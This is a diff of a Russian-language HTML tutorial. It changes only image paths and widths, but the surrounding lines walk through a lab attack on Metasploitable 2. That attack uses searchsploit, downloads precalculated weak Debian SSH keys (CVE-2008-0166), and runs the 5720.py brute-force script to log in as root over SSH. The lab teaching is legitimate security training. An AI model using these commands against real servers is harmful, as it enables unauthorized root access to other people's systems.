@@ -569,7 +569,7 @@ SSH-2.0-OpenSSH_4.7p1 Debian-8ubuntu1
 </p>
 
 <p>
-<img src="./pic/pic56.jpg" width=1100 alt="google search result for query OpenSSH 4.7p1-8ubuntu1 версия ssl">
+<img src="./picc/pic56.jpg" width=1400 alt="google search result for query OpenSSH 4.7p1-8ubuntu1 версия ssl">
 </p>
 
 <p>
@@ -642,7 +642,7 @@ OpenSSH           Пакет                 Типичная OpenSSL
 </p>
 
 
-<img src="./pic/pic57.jpg" width=1100 alt="google search result for query openssl 4.7p1 версия ubuntu">
+<img src="./picc/pic57.jpg" width=1400 alt="google search result for query openssl 4.7p1 версия ubuntu">
 
 <p>
 6) даем команду в терминале Kali Linux:
@@ -652,7 +652,7 @@ OpenSSH           Пакет                 Типичная OpenSSL
 searchsploit openssl
 </p>
 
-<img src="./pic/pic58.jpg" width=1100 alt="терминал kali linux вывод команды searchsploit openssl">
+<img src="./picc/pic58.jpg" width=1400 alt="терминал kali linux вывод команды searchsploit openssl">
 
 <p>
 В Kali Linux SearchSploit обычно уже установлен, потому что он входит в стандартный набор инструментов для тестирования безопасности.
@@ -1052,7 +1052,7 @@ searchsploit -x linux/remote/5622.txt
 </p>
 
 
-<img src="./pic/pic59.jpg" width=1100 alt="команда searchsploit в терминале kali linux">
+<img src="./picc/pic59.jpg" width=1400 alt="команда searchsploit в терминале kali linux">
 
 <p>
 в выводе пишет
@@ -1106,7 +1106,7 @@ wget https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sp
 </p>
 
 
-<img src="./pic/pic60.jpg" width=1100 alt="команда wget в терминале kali linux">
+<img src="./picc/pic60.jpg" width=1400 alt="команда wget в терминале kali linux">
 
 <p>
 После скачивания выполняется второй пункт инструкции из файла 5622.txt - второй пункт разархивация:
@@ -1116,7 +1116,7 @@ wget https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sp
 tar -xjf 5622.tar.bz2
 </p>
 
-<img src="./pic/pic61.jpg" width=1100 alt="команда tar в терминале kali linux">
+<img src="./picc/pic61.jpg" width=1400 alt="команда tar в терминале kali linux">
 
 <p>
 Архив 5622.tar.bz2 не содержит сам эксплойт 5720.py. Он содержит заранее вычисленные (precalculated) слабые SSH-ключи, которые были сгенерированы уязвимой версией OpenSSL в Debian (CVE-2008-0166).
@@ -1143,7 +1143,7 @@ searchsploit -m 5720
 </p>
 
 
-<img src="./pic/pic62.jpg" width=1100 alt="команда searchsploit -m в терминале kali linux">
+<img src="./picc/pic62.jpg" width=1400 alt="команда searchsploit -m в терминале kali linux">
 
 
 <p>
@@ -1219,7 +1219,7 @@ python2 5720.py rsa/2048/ 10.0.2.3 root 22 5
 </p>
 
 
-<img src="./pic/pic63.jpg" width=1100 alt="команда python2 5720.py в терминале kali linux">
+<img src="./picc/pic63.jpg" width=1400 alt="команда python2 5720.py в терминале kali linux">
 
 <p>
 результат выполнения команды скриншот ниже - нашло наш ключ, у меня перебор занял приблизительно 45 минут.
@@ -1232,7 +1232,7 @@ Execute: ssh -lroot -p22 -i rsa/2048//57c3115d77c56390332dc5c49978627a-5429 10.0
 
 </pre>
 
-<img src="./pic/pic64.jpg" width=1100 alt="вывод команды python2 5720.py в терминале kali linux">
+<img src="./picc/pic64.jpg" width=1400 alt="вывод команды python2 5720.py в терминале kali linux">
 
 <p>
 7)далее теперь у нас есть ключ можем зайти по ssh дать команду в терминале нашего Kali Linux
@@ -1244,7 +1244,7 @@ ssh -i rsa/2048/57c3115d77c56390332dc5c49978627a-5429 -oHostKeyAlgorithms=+ssh-r
 
 </p>
 
-<img src="./pic/pic65.jpg" width=1100 alt="вывод команды ssh в терминале kali linux">
+<img src="./picc/pic65.jpg" width=1400 alt="вывод команды ssh в терминале kali linux">
 
 <p>
 если дать команду 
@@ -1259,7 +1259,7 @@ exit
 </p>
 
 
-<img src="./pic/pic66.jpg" width=1100 alt="вывод команды ssh в терминале kali linux">
+<img src="./picc/pic66.jpg" width=1400 alt="вывод команды ssh в терминале kali linux">
 
 <p>
 вот этот файл из вывода скрипта:
@@ -1441,7 +1441,7 @@ cat /root/.ssh/authorized_keys
 </p>
 
 <p>
-<img src="./pic/pic67.jpg" width=1100 alt="команда cat терминал  metasploitable 2">
+<img src="./picc/pic67.jpg" width=1400 alt="команда cat терминал  metasploitable 2">
 </p>
 
 <p>
@@ -1499,7 +1499,7 @@ ssh-keygen -lf /root/.ssh/authorized_keys
 </p>
 
 
-<img src="./pic/pic68.jpg" width=1100 alt="команда ssh-keygen терминал metasploitable 2">
+<img src="./picc/pic68.jpg" width=1400 alt="команда ssh-keygen терминал metasploitable 2">
 
 <p>
 как видим md5 хеш ssh публичного ключа полученный в Metasploitable 2 совпадает с именем файла ключа на нашей Kali Linux.
@@ -1529,7 +1529,7 @@ ssh-keygen -lf /root/.ssh/authorized_keys
 find rsa/2048 -type f | grep "57c3115d77c56390332dc5c49978627a" 
 </p>
 
-<img src="./pic/pic69.jpg" width=1100 alt="команда find терминал kali linux">
+<img src="./picc/pic69.jpg" width=1400 alt="команда find терминал kali linux">
 
 <p>
 нашло два файла
@@ -1552,7 +1552,7 @@ ssh-keygen -E md5 -lf rsa/2048/57c3115d77c56390332dc5c49978627a-5429
 </p>
 
 
-<img src="./pic/pic70.jpg" width=1100 alt="команда ssh-keygen терминал kali linux">
+<img src="./picc/pic70.jpg" width=1400 alt="команда ssh-keygen терминал kali linux">
 
 <p>
 ssh-keygen — утилита для работы с SSH-ключами
